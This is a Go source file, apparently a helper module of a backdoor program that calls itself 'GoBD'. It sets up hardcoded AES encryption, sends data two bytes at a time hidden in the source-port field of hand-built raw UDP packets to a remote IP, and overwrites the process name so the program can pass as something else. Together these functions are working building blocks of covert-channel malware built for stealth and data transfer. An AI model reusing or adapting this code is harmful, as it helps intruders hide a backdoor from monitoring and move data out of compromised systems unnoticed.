package main
import(
	"reflect"
	"unsafe"
	"encoding/binary"
	"fmt"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket"
	"net"
	"os"
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
)
var iv []byte;
var block cipher.Block;
/* 
    FUNCTION: func intiateTools()
    RETURNS: Nothing

    ABOUT:
    Intiates the the iv and the cipher block for encryption and decryption.
*/
func intiateTools(){

	keytext := (([]byte)("s92jmc912hfye>p[c620cmi:pqinuysh"));
	block, _ = aes.NewCipher(keytext);
	ciphercode, _ := hex.DecodeString("a09c2cb3d389f6901176cbbd5ba9535f87f4f1532325bc9ecf336bb209073e7725f0a21255ab4cdf97a3a74ad0286b6d637145476af6dd740bad9214912f79de66190aef6e7a6789f46be6bf654286bf17c53a1d8c399ccdd4c59ac1c1df108709cc7690");
	iv = ciphercode[:aes.BlockSize];
}
/* 
    FUNCTION: func encrypt_data(data string) []byte
    RETURNS: []byte, the encrypted data
    ARGUMENTS: 
   1             string data - the data to encrypt

    ABOUT:
    Encrypts data using the programs specified algorithm. Returns the encrypted data.
*/
func encrypt_data(data string) []byte {
	
	text := ([]byte(data));
	
	cfb := cipher.NewCFBEncrypter(block, iv);
	ciphertext := make([]byte, len(text));
	cfb.XORKeyStream(ciphertext, text);

	return ciphertext;
}
/* 
    FUNCTION: func decrypt_data(data []byte) string
    RETURNS: String, the decrypted data
    ARGUMENTS: 
                []byte data - the encrypted data to decrypt

    ABOUT:
    Decrypts data using the programs specified algorithm. Returns the decrypted data.
*/
func decrypt_data(data []byte) string {
	
	cfbdec := cipher.NewCFBDecrypter(block, iv);
	plaintextCopy := make([]byte, len(data));
	cfbdec.XORKeyStream(plaintextCopy, data);

	return string(plaintextCopy[:]);
}
/* 
    FUNCTION: sendEncryptedData(port int, data, ip string)
    RETURNS: Nothing
    ARGUMENTS: 
                string ip : the ip address of the server
                int port : port to send data to

    ABOUT:
    Sends encrypted data over UDP to the spcified port and ip.
*/
func sendEncryptedData(port uint16, data, ip string) {

	size := len(data)
	if size % 2 != 0 {
		data = fmt.Sprintf(data, "0")
	}
	
	for p := 0; p <= size; p = p + 2 {

		var buffer []byte
		
		if p == size {
			temp := []byte{0, 0}
			buffer = craftPacket(temp, ip, SND_CMPLETE, []byte{});
		} else {
			temp := []byte{data[p], data[p+1]}
			buffer = craftPacket(temp, ip, port, []byte{}); 
		}
		
		if buffer == nil { // if original query was invalid
			fmt.Print("Buffer error, returned nil.\n")
			continue
		}

		err := handle.WritePacketData(buffer);
		checkError(err)
	}
}

func craftPacket(data []byte, ip string, port uint16, payload []byte) []byte {
	
	ethernetLayer := &layers.Ethernet{
		SrcMAC: localmac,
		DstMAC: destmac,
		EthernetType: layers.EthernetTypeIPv4,
	}
	
	ipLayer := &layers.IPv4{
		Version:    4,
		IHL:        5,
		TOS:        0,
		Length:     20,
		Id:         2,
		Flags:      layers.IPv4DontFragment,
		FragOffset: 0,
		TTL:        255,
		Protocol:   layers.IPProtocolUDP,
		Checksum:   0,
		SrcIP:      localip,
		DstIP:      net.ParseIP(ip),
	}

	val := binary.BigEndian.Uint16(data)
	udpLayer := &layers.UDP{
		SrcPort: layers.UDPPort(MAX_PORT - val), 
		DstPort: layers.UDPPort(port),
		Length: 16,
	}

	err := udpLayer.SetNetworkLayerForChecksum(ipLayer)
	checkError(err)
	
	buf := gopacket.NewSerializeBuffer();
	opts := gopacket.SerializeOptions{
		FixLengths: true,
		ComputeChecksums: true,
	}

	err = gopacket.SerializeLayers(buf, opts, ethernetLayer, ipLayer, udpLayer, gopacket.Payload(payload));
	checkError(err);

	return buf.Bytes()
}
///Utility Functions//////////////////////////////////////////
/* 
    FUNCTION: func checkError(err error)
    RETURNS: Nothing
    ARGUMENTS: 
              err error : the error code to check

    ABOUT:
    Checks an error code, panics if the error is not nil.
*/
func checkError(err error){
	if err != nil {
		panic(err)
	}
}
/* 
    FUNCTION: func SetProcessName(name string) error
    RETURNS: err Error, if anything goes wrong
    ARGUMENTS: 
                string name: the new process name to set the program to

    ABOUT:
    Sets the process name of the GoBD program to name.
*/
func SetProcessName(name string) error {
    argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]));
    argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len];

    n := copy(argv0, name);
    if n < len(argv0) {
            argv0[n] = 0
    }

    return nil
}

/* 
    FUNCTION: func GetLocalIP() string
    RETURNS: String, the local ip 

    ABOUT:
    Grabs the local ip of the host system.
*/
func GetLocalIP() net.IP {
    addrs, err := net.InterfaceAddrs();
	checkError(err);
	
    for _, address := range addrs {
        if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
            if ipnet.IP.To4() != nil {
                return ipnet.IP;
            }
        }
    }
	
    return nil;
}
func GetLocalMAC(iface string) (macAddr net.HardwareAddr){

	netInterface, err := net.InterfaceByName(iface)
	checkError(err)

	macAddr = netInterface.HardwareAddr
	return macAddr;
}
